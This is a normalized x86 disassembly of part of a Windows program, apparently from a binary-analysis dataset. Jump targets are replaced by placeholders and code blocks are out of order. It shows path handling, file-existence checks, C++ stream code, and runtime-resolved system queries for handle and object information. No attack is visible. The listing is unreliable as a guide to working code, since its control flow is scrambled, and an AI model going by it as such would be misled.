jmp r-xdata
cmp [ esi + 0x14 ] 0x8
jb r-xdata
xor ecx ecx
mov [ ebp - 0x234 ] cx
push ecx
mov eax r--data
lea ecx [ ebp - 0x234 ]
mov [ ebp - 0x220 ] 0x7
mov [ ebp - 0x224 ] 0x0
call sub_401c90
lea edx [ ebp - 0x234 ]
push edx
mov [ ebp - 0x4 ] 0x0
call sub_40e370
mov bl al
add esp 0x4
test bl bl
je r-xdata
push eax
call [ PathIsRelativeW@IAT ]
test eax eax
je r-xdata
push esi
lea edx [ ebp - 0x218 ]
push edx
call [ PathCanonicalizeW@IAT ]
test eax eax
setne bl
test bl bl
je r-xdata
mov esi [ esi ]
cmp [ ebp - 0x220 ] 0x8
jb r-xdata
mov eax 0x8
cmp [ esi + 0x14 ] eax
jb r-xdata
mov al bl
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop esi
pop ebx
mov ecx [ ebp - 0x10 ]
xor ecx ebp
call sub_437c1c
mov esp ebp
pop ebp
retn
lea eax [ ebp - 0x218 ]
lea edx [ eax + 0x2 ]
jmp r-xdata
mov ecx [ ebp - 0x234 ]
push ecx
call sub_43811c
add esp 0x4
jmp r-xdata
cmp [ ebp - 0x220 ] eax
mov eax [ ebp - 0x234 ]
jae r-xdata
mov esi [ esi ]
mov cx [ eax ]
add eax 0x2
test cx cx
jne r-xdata
push esi
push eax
lea eax [ ebp - 0x218 ]
push eax
call [ PathCombineW@IAT ]
lea eax [ ebp - 0x218 ]
lea edx [ eax + 0x2 ]
lea eax [ ebp - 0x234 ]
mov ecx [ ebp - 0x238 ]
sub eax edx
sar eax 0x1
push eax
lea eax [ ebp - 0x218 ]
call sub_401c90
mov cx [ eax ]
add eax 0x2
test cx cx
jne r-xdata
mov ecx [ ebp - 0x238 ]
sub eax edx
sar eax 0x1
push eax
lea eax [ ebp - 0x218 ]
call sub_401c90
sub_40e570
cmp [ eax + 0x14 ] 0x8
jb r-xdata
push 0x0
push 0x0
push 0x3
push 0x0
push 0x1
push 0x0
push eax
call [ CreateFileW@IAT ]
test eax eax
je r-xdata
mov eax [ eax ]
call [ GetLastError@IAT ]
cmp eax 0x2
sete al
test al al
je r-xdata
cmp eax 0xffffffff
je r-xdata
retn
mov [ esi ] 0x0
push ebx
push eax
mov bl 0x1
call [ CloseHandle@IAT ]
mov [ esi ] bl
mov al bl
pop ebx
retn
sub_40e5c0
push ebp
mov ebp esp
sub esp 0x10
push ebx
push r--data
push r--data
xor bl bl
call [ GetModuleHandleW@IAT ]
push eax
call [ GetProcAddress@IAT ]
mov [ ebp - 0x10 ] eax
test eax eax
je r-xdata
mov al bl
pop ebx
mov esp ebp
pop ebp
retn
push esi
mov esi 0x10000
push esi
call sub_435b34
add esp 0x4
mov ebx eax
lea eax [ ebp - 0xc ]
push eax
push esi
push ebx
push 0x10
mov [ ebp - 0x8 ] ebx
mov [ ebp - 0xc ] 0x0
call [ ebp - 0x10 ]
cmp eax 0xc0000004
jne r-xdata
test eax eax
sete al
mov [ ebp - 0x1 ] al
test al al
je r-xdata
push ebx
call sub_438111
add esi esi
push esi
call sub_435b34
add esp 0x8
lea ecx [ ebp - 0xc ]
push ecx
push esi
push eax
push 0x10
mov [ ebp - 0x8 ] eax
call [ ebp - 0x10 ]
mov ebx [ ebp - 0x8 ]
cmp eax 0xc0000004
je r-xdata
push ebx
call sub_438111
mov al [ ebp - 0x1 ]
add esp 0x4
pop esi
pop ebx
mov esp ebp
pop ebp
retn
cmp [ ebx ] 0x0
mov [ ebp - 0x10 ] 0x0
jbe r-xdata
add ebx 0x4
mov eax [ edi + 0x4 ]
cmp ebx eax
jae r-xdata
mov edx [ eax ]
cmp edx [ ebx ]
jne r-xdata
cmp eax [ edi + 0x8 ]
jne r-xdata
mov ecx [ edi ]
cmp ecx ebx
ja r-xdata
mov eax [ ebp - 0x10 ]
mov ecx [ ebp - 0x8 ]
inc eax
add ebx 0x10
mov [ ebp - 0x10 ] eax
cmp eax [ ecx ]
jb r-xdata
mov eax [ edi + 0x4 ]
test eax eax
je r-xdata
mov edx edi
call sub_40e7c0
mov esi ebx
sub esi ecx
cmp eax [ edi + 0x8 ]
jne r-xdata
mov eax [ ebp + 0x8 ]
test eax eax
je r-xdata
mov ebx ecx
add [ edi + 0x4 ] 0x10
mov ecx [ ebx ]
mov [ eax ] ecx
mov edx [ ebx + 0x4 ]
mov [ eax + 0x4 ] edx
mov ecx [ ebx + 0x8 ]
mov [ eax + 0x8 ] ecx
mov edx [ ebx + 0xc ]
mov eax [ edi + 0x4 ]
and esi 0xfffffff0
add esi [ edi ]
test eax eax
je r-xdata
mov edx edi
call sub_40e7c0
mov ecx [ esi ]
mov [ eax ] ecx
mov edx [ esi + 0x4 ]
mov [ eax + 0x4 ] edx
mov ecx [ esi + 0x8 ]
mov [ eax + 0x8 ] ecx
mov edx [ esi + 0xc ]
jmp r-xdata
mov [ eax + 0xc ] edx
sub_40e710
push ebp
mov ebp esp
push ecx
push ebx
push esi
push r--data
push r--data
xor bl bl
call [ GetModuleHandleW@IAT ]
push eax
call [ GetProcAddress@IAT ]
mov esi eax
test esi esi
je r-xdata
pop esi
mov al bl
pop ebx
mov esp ebp
pop ebp
retn
lea eax [ ebp - 0x4 ]
push eax
push 0x0
push 0x0
push 0x2
push edi
mov [ ebp - 0x4 ] 0x0
call esi
cmp eax 0xc0000004
jne r-xdata
mov ecx [ ebp - 0x4 ]
push ecx
call sub_435b34
mov edx [ ebp + 0x8 ]
add esp 0x4
lea ecx [ ebp - 0x4 ]
push ecx
mov [ edx ] eax
mov edx [ ebp - 0x4 ]
push edx
push eax
push 0x2
push edi
call esi
test eax eax
setns bl
test bl bl
jne r-xdata
mov eax [ ebp + 0x8 ]
push eax
call sub_438111
add esp 0x4
sub_40e790
push ebp
mov ebp esp
test esi esi
jne r-xdata
mov eax [ esi ]
mov eax [ eax + 0x4 ]
add eax esi
push eax
call [ ebp + 0x8 ]
add esp 0x4
mov eax esi
pop ebp
retn 0x4
xor eax eax
push eax
call [ ebp + 0x8 ]
add esp 0x4
mov eax esi
pop ebp
retn 0x4
sub_40e7c0
mov eax [ edx + 0x4 ]
push esi
mov esi [ edx ]
sub eax esi
sar eax 0x4
cmp eax 0xffffffe
jbe r-xdata
mov ecx [ edx + 0x8 ]
sub ecx esi
inc eax
sar ecx 0x4
cmp eax ecx
jbe r-xdata
push r--data
call sub_435a79
pop esi
retn
push edi
mov esi ecx
shr esi 0x1
mov edi 0xfffffff
sub edi esi
cmp edi ecx
pop edi
jae r-xdata
add ecx esi
xor ecx ecx
jmp r-xdata
pop esi
jmp sub_40e810
mov ecx eax
cmp ecx eax
jae r-xdata
sub_40e810
push ebp
mov ebp esp
push 0xffffffff
push sub_451090
mov eax [ fs : 0x0 ]
push eax
sub esp 0x8
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov [ ebp - 0x10 ] esp
mov ebx ecx
mov esi edx
cmp ebx 0xfffffff
jbe r-xdata
mov eax [ esi + 0x8 ]
sub eax [ esi ]
sar eax 0x4
cmp eax ebx
jae r-xdata
push r--data
call sub_435a79
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
call sub_40e8d0
mov [ ebp - 0x4 ] 0x0
mov edx [ esi + 0x4 ]
mov ecx [ esi ]
mov [ ebp - 0x14 ] eax
mov edi [ ebp - 0x14 ]
push edi
call sub_40ec00
mov eax [ esi ]
mov edi [ esi + 0x4 ]
add esp 0x4
sub edi eax
test eax eax
je r-xdata
mov eax [ ebp - 0x14 ]
shl ebx 0x4
add ebx eax
and edi 0xfffffff0
add edi eax
mov [ esi + 0x8 ] ebx
mov [ esi + 0x4 ] edi
mov [ esi ] eax
push eax
call sub_43811c
add esp 0x4
sub_40e8d0
push ebp
mov ebp esp
sub esp 0x10
xor eax eax
test ecx ecx
je r-xdata
mov esp ebp
pop ebp
retn
cmp ecx 0xfffffff
ja r-xdata
lea eax [ ebp - 0x4 ]
push eax
lea ecx [ ebp - 0x10 ]
mov [ ebp - 0x4 ] 0x0
call sub_437cb3
push r--data
lea ecx [ ebp - 0x10 ]
push ecx
mov [ ebp - 0x10 ] r--data
call sub_43c3a5
shl ecx 0x4
push ecx
call sub_438178
add esp 0x4
test eax eax
jne r-xdata
sub_40e920
push ebp
mov ebp esp
and esp 0xfffffff8
test esi esi
jne r-xdata
mov eax [ esi ]
mov eax [ eax + 0x4 ]
add eax esi
xor eax eax
jmp r-xdata
mov edx [ ecx + 0xc ]
push edx
mov edx [ ecx + 0x8 ]
push edx
push eax
mov eax [ ecx ]
call eax
add esp 0xc
mov eax esi
mov esp ebp
pop ebp
retn
sub_40e950
push ebp
mov ebp esp
push 0xffffffff
push sub_451f3a
mov eax [ fs : 0x0 ]
push eax
sub esp 0x1c
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov [ ebp - 0x10 ] esp
mov esi [ ebp + 0x8 ]
mov eax [ esi ]
mov ecx [ eax + 0x4 ]
mov ecx [ ecx + esi + 0x38 ]
xor ebx ebx
mov edi esi
mov [ ebp - 0x14 ] ebx
mov [ ebp - 0x28 ] edi
test ecx ecx
je r-xdata
mov [ ebp - 0x4 ] 0x0
mov ecx [ esi ]
mov eax [ ecx + 0x4 ]
cmp [ eax + esi + 0xc ] 0x0
jne r-xdata
mov edx [ ecx ]
mov eax [ edx + 0x4 ]
call eax
mov eax [ esi ]
mov edx [ eax + 0x4 ]
add edx esi
cmp [ edx + 0xc ] 0x0
sete al
mov [ ebp - 0x24 ] al
mov [ ebp - 0x4 ] 0x1
test al al
je r-xdata
mov eax [ eax + esi + 0x3c ]
test eax eax
je r-xdata
mov eax [ esi ]
mov eax [ eax + 0x4 ]
xor ecx ecx
mov [ eax + esi + 0x20 ] ecx
mov [ eax + esi + 0x24 ] ecx
mov ecx [ esi ]
mov ecx [ ecx + 0x4 ]
add ecx esi
test ebx ebx
je r-xdata
mov ecx [ edx + 0x24 ]
mov eax [ edx + 0x20 ]
test ecx ecx
jg r-xdata
mov ecx eax
call sub_403670
mov [ ebp - 0x4 ] 0x4
call j_sub_43d14a
test al al
jne r-xdata
mov eax [ ecx + 0xc ]
or eax ebx
cmp [ ecx + 0x38 ] 0x0
jne r-xdata
sub eax 0x1
sbb ecx 0x0
mov edi eax
mov [ ebp - 0x1c ] ecx
jl r-xdata
mov [ ebp - 0x4 ] 0xffffffff
mov edx [ edi ]
mov eax [ edx + 0x4 ]
mov ecx [ eax + edi + 0x38 ]
test ecx ecx
je r-xdata
mov ecx edi
call sub_404650
push 0x0
push eax
call sub_402d50
or eax 0x4
mov edx [ esi ]
mov eax [ edx + 0x4 ]
mov ecx [ eax + esi + 0x38 ]
mov edx [ ecx + 0x24 ]
cmp [ edx ] 0x0
je r-xdata
test ebx ebx
jne r-xdata
xor edi edi
mov [ ebp - 0x1c ] edi
jmp r-xdata
cmp eax 0x1
ja r-xdata
mov eax esi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov edx [ ecx ]
mov eax [ edx + 0x8 ]
call eax
mov eax [ ecx ]
mov edx [ ebp + 0xc ]
mov eax [ eax + 0xc ]
push edx
call eax
movzx eax ax
mov eax [ ecx + 0x34 ]
cmp [ eax ] 0x0
jle r-xdata
mov [ ebp - 0x4 ] 0x1
mov edi [ ebp - 0x28 ]
cmp [ ebp - 0x1c ] ebx
jl r-xdata
mov [ ebp - 0x4 ] 0x2
mov edx [ edx + 0x14 ]
and edx 0x1c0
cmp edx 0x40
je r-xdata
test ebx ebx
jne r-xdata
mov ebx 0x4
mov [ ebp - 0x14 ] ebx
dec [ eax ]
mov ecx [ ecx + 0x24 ]
mov eax [ ecx ]
lea edx [ eax + 0x2 ]
mov [ ecx ] edx
mov ecx [ ebp + 0xc ]
mov [ eax ] cx
movzx eax cx
jmp r-xdata
jg r-xdata
cmp [ ebp - 0x1c ] ebx
jl r-xdata
mov ecx 0xffff
cmp cx ax
jne r-xdata
mov edx [ esi ]
mov eax [ edx + 0x4 ]
mov ecx [ eax + esi + 0x38 ]
movzx edx [ eax + esi + 0x40 ]
mov eax [ ecx + 0x24 ]
cmp [ eax ] 0x0
je r-xdata
test edi edi
je r-xdata
jg r-xdata
mov eax [ ecx ]
push edx
mov edx [ eax + 0xc ]
call edx
movzx eax ax
mov eax [ ecx + 0x34 ]
cmp [ eax ] 0x0
jle r-xdata
mov edx [ esi ]
mov eax [ edx + 0x4 ]
mov ecx [ eax + esi + 0x38 ]
movzx edx [ eax + esi + 0x40 ]
mov eax [ ecx + 0x24 ]
cmp [ eax ] 0x0
je r-xdata
test edi edi
je r-xdata
add edi 0xffffffff
adc [ ebp - 0x1c ] 0xffffffff
jmp r-xdata
mov ebx 0x4
mov [ ebp - 0x14 ] ebx
dec [ eax ]
mov ecx [ ecx + 0x24 ]
mov eax [ ecx ]
lea ebx [ eax + 0x2 ]
mov [ ecx ] ebx
mov ebx [ ebp - 0x14 ]
mov [ eax ] dx
mov eax edx
jmp r-xdata
mov eax [ ecx ]
push edx
mov edx [ eax + 0xc ]
call edx
movzx eax ax
mov eax [ ecx + 0x34 ]
cmp [ eax ] 0x0
jle r-xdata
mov ecx 0xffff
cmp cx ax
jne r-xdata
add edi 0xffffffff
adc [ ebp - 0x1c ] 0xffffffff
jmp r-xdata
mov ebx 0x4
mov [ ebp - 0x14 ] ebx
dec [ eax ]
mov ecx [ ecx + 0x24 ]
mov eax [ ecx ]
lea ebx [ eax + 0x2 ]
mov [ ecx ] ebx
mov ebx [ ebp - 0x14 ]
mov [ eax ] dx
mov eax edx
jmp r-xdata
mov ecx 0xffff
cmp cx ax
jne r-xdata
sub_40eb45
mov eax [ ebp + 0x8 ]
mov edx [ eax ]
mov ecx [ edx + 0x4 ]
add ecx eax
mov eax [ ecx + 0xc ]
or eax 0x4
cmp [ ecx + 0x38 ] 0x0
jne r-xdata
push 0x1
push eax
call sub_402d50
mov [ ebp - 0x4 ] 0x1
mov eax r-xdata
retn
or eax 0x4
sub_40ec00
cmp ecx edx
je r-xdata
retn
push esi
add ecx 0x10
add eax 0x10
cmp ecx edx
jne r-xdata
mov esi [ ecx ]
mov [ eax ] esi
mov esi [ ecx + 0x4 ]
mov [ eax + 0x4 ] esi
mov esi [ ecx + 0x8 ]
mov [ eax + 0x8 ] esi
mov esi [ ecx + 0xc ]
mov [ eax + 0xc ] esi
test eax eax
je r-xdata
pop esi
sub_40ec30
push ebp
mov ebp esp
lea eax [ ebp - 0x10 ]
sub esp 0x10
push eax
mov [ esi + 0x4 ] 0x0
mov [ esi ] r--data
call sub_43668d
mov ecx [ eax ]
mov [ esi + 0x8 ] ecx
mov edx [ eax + 0x4 ]
mov [ esi + 0xc ] edx
mov ecx [ eax + 0x8 ]
mov [ esi + 0x10 ] ecx
mov edx [ eax + 0xc ]
add esp 0x4
mov [ esi + 0x14 ] edx
mov eax esi
mov esp ebp
pop ebp
retn
sub_40ec70
push ebp
mov ebp esp
push 0xffffffff
push sub_45130b
mov eax [ fs : 0x0 ]
push eax
sub esp 0x28
push ebx
push esi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
xor ebx ebx
mov [ ebp - 0x10 ] ebx
cmp edi ebx
je r-xdata
mov eax 0x2
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop esi
pop ebx
mov esp ebp
pop ebp
retn
cmp [ edi ] ebx
jne r-xdata
push 0x18
call sub_438178
mov esi eax
add esp 0x4
mov [ ebp - 0x10 ] esi
mov [ ebp - 0x4 ] ebx
cmp esi ebx
je r-xdata
xor eax eax
mov eax [ ebp + 0x8 ]
mov eax [ eax ]
mov ecx [ eax + 0x18 ]
cmp ecx ebx
jne r-xdata
lea ecx [ ebp - 0x34 ]
call sub_4026b0
push ecx
lea ecx [ ebp - 0x34 ]
call sub_402600
mov ebx 0x1
call sub_40ec30
jmp r-xdata
lea ecx [ eax + 0x1c ]
mov [ ebp - 0x4 ] 0xffffffff
mov [ edi ] eax
test bl 0x1
je r-xdata
sub_40ed30
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0xc ]
push esi
mov esi [ ebp + 0x8 ]
cmp esi ebx
je r-xdata
mov eax esi
pop esi
pop ebx
pop ebp
retn 0x8
push edi
lea edi [ ecx + 0x8 ]
movzx eax [ esi ]
push edi
push eax
call sub_436580
mov [ esi ] al
inc esi
add esp 0x8
cmp esi ebx
jne r-xdata
pop edi
sub_40ed80
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0xc ]
push esi
mov esi [ ebp + 0x8 ]
cmp esi ebx
je r-xdata
mov eax esi
pop esi
pop ebx
pop ebp
retn 0x8
push edi
lea edi [ ecx + 0x8 ]
movzx eax [ esi ]
push edi
push eax
call sub_4374cf
mov [ esi ] al
inc esi
add esp 0x8
cmp esi ebx
jne r-xdata
pop edi
sub_40edc0
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov edx [ ebp + 0x10 ]
push esi
mov esi [ ebp + 0xc ]
mov ecx esi
sub ecx eax
push ecx
push eax
push edx
call sub_43a8a0
add esp 0xc
mov eax esi
pop esi
pop ebp
retn 0xc
sub_40ee00
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov edx [ ebp + 0x14 ]
push esi
mov esi [ ebp + 0xc ]
mov ecx esi
sub ecx eax
push ecx
push eax
push edx
call sub_43a8a0
add esp 0xc
mov eax esi
pop esi
pop ebp
retn 0x10
sub_40ee30
push ebp
mov ebp esp
push esi
mov esi ecx
mov eax [ esi + 0x14 ]
mov [ esi ] r--data
test eax eax
jle r-xdata
jns r-xdata
mov eax [ esi + 0x10 ]
push eax
call sub_4381f8
jmp r-xdata
test [ ebp + 0x8 ] 0x1
mov [ esi ] r--data
je r-xdata
mov ecx [ esi + 0x10 ]
push ecx
call sub_438111
add esp 0x4
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call sub_43811c
add esp 0x4
sub_40ee80
mov eax [ esi ]
mov eax [ eax + 0x4 ]
push edi
xor edi edi
test [ eax + esi + 0xc ] 0x6
jne r-xdata
mov ecx [ esi ]
mov ecx [ ecx + 0x4 ]
add ecx esi
test edi edi
je r-xdata
mov eax [ eax + esi + 0x38 ]
mov edx [ eax ]
mov ecx eax
mov eax [ edx + 0x34 ]
call eax
cmp eax 0xffffffff
jne r-xdata
mov eax esi
pop edi
retn
mov eax [ ecx + 0xc ]
or eax edi
cmp [ ecx + 0x38 ] 0x0
jne r-xdata
mov edi 0x4
push 0x0
push eax
call sub_402d50
or eax 0x4
sub_40eee0
push ebp
mov ebp esp
push 0xffffffff
push sub_451f02
mov eax [ fs : 0x0 ]
push eax
sub esp 0x24
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov [ ebp - 0x10 ] esp
mov esi [ ebp + 0x8 ]
mov eax [ esi ]
mov ecx [ eax + 0x4 ]
mov ecx [ ecx + esi + 0x38 ]
xor edi edi
mov [ ebp - 0x18 ] edi
mov [ ebp - 0x2c ] esi
cmp ecx edi
je r-xdata
mov [ ebp - 0x4 ] edi
mov ecx [ esi ]
mov eax [ ecx + 0x4 ]
cmp [ eax + esi + 0xc ] edi
jne r-xdata
mov edx [ ecx ]
mov eax [ edx + 0x4 ]
call eax
mov eax [ esi ]
mov ecx [ eax + 0x4 ]
cmp [ ecx + esi + 0xc ] edi
sete cl
mov [ ebp - 0x28 ] cl
mov [ ebp - 0x4 ] 0x1
test cl cl
je r-xdata
mov eax [ eax + esi + 0x3c ]
cmp eax edi
je r-xdata
mov edx [ esi ]
mov ecx [ edx + 0x4 ]
add ecx esi
test edi edi
je r-xdata
mov ecx [ eax + 0x4 ]
lea edx [ ebp - 0x1c ]
push edx
add ecx esi
call sub_402e50
mov edi eax
mov [ ebp - 0x4 ] 0x2
call sub_40a340
mov [ ebp - 0x4 ] 0x1
mov ebx [ ebp - 0x1c ]
mov [ ebp - 0x14 ] eax
test ebx ebx
je r-xdata
mov ecx eax
call sub_403670
mov [ ebp - 0x4 ] 0x5
call j_sub_43d14a
test al al
jne r-xdata
mov eax [ ecx + 0xc ]
or eax edi
cmp [ ecx + 0x38 ] 0x0
jne r-xdata
mov ecx [ esi ]
mov ebx [ ebp + 0xc ]
mov edi [ ebp - 0x14 ]
mov [ ebp - 0x4 ] 0x3
mov eax [ ecx + 0x4 ]
mov ecx [ ecx + 0x4 ]
mov edx [ ecx + esi + 0x38 ]
mov edi [ edi ]
mov [ ebp - 0x24 ] 0x0
movzx ecx [ ecx + esi + 0x40 ]
push ebx
push ecx
mov ecx [ ebp - 0x14 ]
add eax esi
push eax
push edx
mov edx [ ebp - 0x24 ]
push edx
mov edx [ edi + 0x1c ]
lea eax [ ebp - 0x24 ]
push eax
call edx
cmp [ ebp - 0x24 ] 0x0
mov edi 0x4
jne r-xdata
push 0x0
lea ecx [ ebp - 0x20 ]
call sub_436188
mov eax [ ebx + 0x4 ]
test eax eax
je r-xdata
mov [ ebp - 0x4 ] 0xffffffff
mov eax [ esi ]
mov ecx [ eax + 0x4 ]
mov ecx [ ecx + esi + 0x38 ]
test ecx ecx
je r-xdata
mov ecx esi
call sub_404650
push 0x0
push eax
call sub_402d50
or eax 0x4
mov [ ebp - 0x4 ] 0x1
jmp r-xdata
mov edi [ ebp - 0x18 ]
mov edi [ ebx + 0x4 ]
neg edi
sbb edi edi
lea ecx [ ebp - 0x20 ]
not edi
call sub_4361b0
and edi ebx
je r-xdata
cmp eax 0xffffffff
jae r-xdata
mov eax esi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
mov edx [ ecx ]
mov eax [ edx + 0x8 ]
call eax
mov eax [ edi ]
mov edx [ eax ]
push 0x1
mov ecx edi
call edx
dec eax
mov [ ebx + 0x4 ] eax
sub_40f013
mov eax [ ebp + 0x8 ]
mov ecx [ eax ]
mov ecx [ ecx + 0x4 ]
add ecx eax
mov eax [ ecx + 0xc ]
or eax 0x4
cmp [ ecx + 0x38 ] 0x0
jne r-xdata
push 0x1
push eax
call sub_402d50
mov [ ebp - 0x4 ] 0x1
mov eax r-xdata
retn
or eax 0x4
sub_40f0b0
push ebp
mov ebp esp
sub esp 0x8
push ebx
push esi
mov esi ecx
mov ebx [ esi + 0x38 ]
mov [ ebp - 0x4 ] esi
mov [ esi ] r--data
test ebx ebx
je r-xdata
lea ecx [ esi + 0x4 ]
call sub_4361e1
pop esi
pop ebx
mov esp ebp
pop ebp
retn
push edi
mov edi [ ebx ]
test edi edi
je r-xdata
push ebx
call sub_43811c
add esp 0x4
pop edi
push 0x0
lea ecx [ ebp - 0x8 ]
call sub_436188
mov eax [ edi + 0x4 ]
test eax eax
je r-xdata
mov esi [ edi + 0x4 ]
neg esi
sbb esi esi
lea ecx [ ebp - 0x8 ]
not esi
call sub_4361b0
and esi edi
je r-xdata
cmp eax 0xffffffff
jae r-xdata
mov esi [ ebp - 0x4 ]
mov eax [ esi ]
mov edx [ eax ]
push 0x1
mov ecx esi
call edx
dec eax
mov [ edi + 0x4 ] eax
sub_40f160
push esi
mov esi ecx
mov eax [ esi ]
mov edx [ eax + 0x18 ]
call edx
cmp eax 0xffffffff
jne r-xdata
mov eax [ esi + 0x30 ]
dec [ eax ]
mov eax [ esi + 0x20 ]
mov ecx [ eax ]
lea edx [ ecx + 0x1 ]
mov [ eax ] edx
movzx eax [ ecx ]
pop esi
retn
or eax eax
pop esi
retn
sub_40f190
push ebp
mov ebp esp
and esp 0xfffffff8
sub esp 0xc
push ebx
xor eax eax
push esi
push edi
mov ebx ecx
mov [ esp + 0x10 ] eax
mov [ esp + 0x14 ] eax
cmp [ ebp + 0x10 ] eax
jl r-xdata
mov eax [ esp + 0x10 ]
mov edx [ esp + 0x14 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0xc
jg r-xdata
mov eax ebx
call sub_40fb10
mov edi edx
mov esi eax
test edi edi
jl r-xdata
cmp [ ebp + 0xc ] eax
jbe r-xdata
mov eax [ ebx ]
mov edx [ eax + 0x1c ]
mov ecx ebx
call edx
or edx 0xffffffff
cmp eax edx
je r-xdata
jg r-xdata
lea esp [ esp ]
mov ecx [ ebp + 0x8 ]
inc ecx
add [ esp + 0x10 ] 0x1
mov [ ecx - 0x1 ] al
mov [ ebp + 0x8 ] ecx
adc [ esp + 0x14 ] 0x0
add [ ebp + 0xc ] edx
adc [ ebp + 0x10 ] edx
mov eax [ ebp + 0x10 ]
cmp eax edi
jg r-xdata
test esi esi
je r-xdata
jl r-xdata
mov eax [ ebx + 0x20 ]
mov ecx [ eax ]
mov edx [ ebp + 0x8 ]
push esi
push ecx
push edx
call sub_43a8a0
add [ ebp + 0x8 ] esi
mov eax [ ebx + 0x30 ]
add esp 0xc
add [ esp + 0x10 ] esi
adc [ esp + 0x14 ] edi
sub [ ebp + 0xc ] esi
sbb [ ebp + 0x10 ] edi
sub [ eax ] esi
mov eax [ ebx + 0x20 ]
add [ eax ] esi
jmp r-xdata
jl r-xdata
cmp [ ebp + 0xc ] 0x0
ja r-xdata
cmp [ ebp + 0x10 ] 0x0
jg r-xdata
mov esi [ ebp + 0xc ]
mov edi eax
cmp [ ebp + 0xc ] esi
jae r-xdata
sub_40f270
push ebp
mov ebp esp
and esp 0xfffffff8
sub esp 0xc
push ebx
xor eax eax
push esi
push edi
mov ebx ecx
mov [ esp + 0x10 ] eax
mov [ esp + 0x14 ] eax
cmp [ ebp + 0x10 ] eax
jl r-xdata
mov eax [ esp + 0x10 ]
mov edx [ esp + 0x14 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0xc
jg r-xdata
mov eax ebx
call sub_40fb30
mov edi edx
mov esi eax
test edi edi
jl r-xdata
cmp [ ebp + 0xc ] eax
jbe r-xdata
mov eax [ ebp + 0x8 ]
movzx eax [ eax ]
mov edx [ ebx ]
push eax
mov eax [ edx + 0xc ]
mov ecx ebx
call eax
or ecx 0xffffffff
cmp eax ecx
je r-xdata
jg r-xdata
lea esp [ esp ]
mov eax 0x1
add [ ebp + 0x8 ] eax
add [ esp + 0x10 ] eax
adc [ esp + 0x14 ] 0x0
add [ ebp + 0xc ] ecx
adc [ ebp + 0x10 ] ecx
mov eax [ ebp + 0x10 ]
cmp eax edi
jg r-xdata
test esi esi
je r-xdata
jl r-xdata
mov eax [ ebp + 0x8 ]
mov ecx [ ebx + 0x24 ]
mov edx [ ecx ]
push esi
push eax
push edx
call sub_43a8a0
add [ ebp + 0x8 ] esi
mov eax [ ebx + 0x34 ]
add esp 0xc
add [ esp + 0x10 ] esi
adc [ esp + 0x14 ] edi
sub [ ebp + 0xc ] esi
sbb [ ebp + 0x10 ] edi
sub [ eax ] esi
mov eax [ ebx + 0x24 ]
add [ eax ] esi
jmp r-xdata
jl r-xdata
cmp [ ebp + 0xc ] 0x0
ja r-xdata
cmp [ ebp + 0x10 ] 0x0
jg r-xdata
mov esi [ ebp + 0xc ]
mov edi eax
cmp [ ebp + 0xc ] esi
jae r-xdata
sub_40f350
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov ecx [ r--data ]
mov edx [ r--data ]
mov [ eax ] ecx
xor ecx ecx
mov [ eax + 0x4 ] edx
mov [ eax + 0x8 ] ecx
mov [ eax + 0xc ] ecx
mov [ eax + 0x10 ] ecx
pop ebp
retn 0x14
sub_40f380
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov ecx [ r--data ]
mov edx [ r--data ]
mov [ eax ] ecx
xor ecx ecx
mov [ eax + 0x4 ] edx
mov [ eax + 0x8 ] ecx
mov [ eax + 0xc ] ecx
mov [ eax + 0x10 ] ecx
pop ebp
retn 0x20
sub_40f3d0
push esi
mov esi ecx
test [ esi + 0x40 ] 0x1
mov [ esi ] r--data
je r-xdata
mov edx [ esi + 0x10 ]
mov [ edx ] 0x0
mov eax [ esi + 0x20 ]
mov [ eax ] 0x0
mov ecx [ esi + 0x30 ]
mov [ ecx ] 0x0
mov edx [ esi + 0x14 ]
mov [ edx ] 0x0
mov eax [ esi + 0x24 ]
mov [ eax ] 0x0
mov ecx [ esi + 0x34 ]
mov [ ecx ] 0x0
and [ esi + 0x40 ] 0xfffffffe
mov [ esi + 0x3c ] 0x0
mov ecx esi
pop esi
jmp sub_40f0b0
mov eax [ esi + 0x10 ]
mov ecx [ eax ]
push ecx
call sub_43811c
add esp 0x4
sub_40f440
push ebp
mov ebp esp
sub esp 0x8
push esi
mov esi ecx
test [ esi + 0x40 ] 0x8
push edi
je r-xdata
mov eax [ ebp + 0x8 ]
cmp eax 0xffffffff
jne r-xdata
mov edi [ esi + 0x24 ]
mov edx [ edi ]
test edx edx
je r-xdata
mov edx [ esi + 0x24 ]
mov edi [ edx ]
push ebx
test edi edi
je r-xdata
pop edi
xor eax eax
pop esi
mov esp ebp
pop ebp
retn 0x4
mov ecx [ esi + 0x3c ]
cmp edx ecx
jae r-xdata
test [ esi + 0x40 ] 0x2
jne r-xdata
mov ecx [ esi + 0x34 ]
mov ebx [ ecx ]
mov edx edi
add ebx edx
cmp edx ebx
jae r-xdata
mov eax [ esi + 0x34 ]
mov eax [ eax ]
add eax edx
mov [ edi ] ecx
sub eax ecx
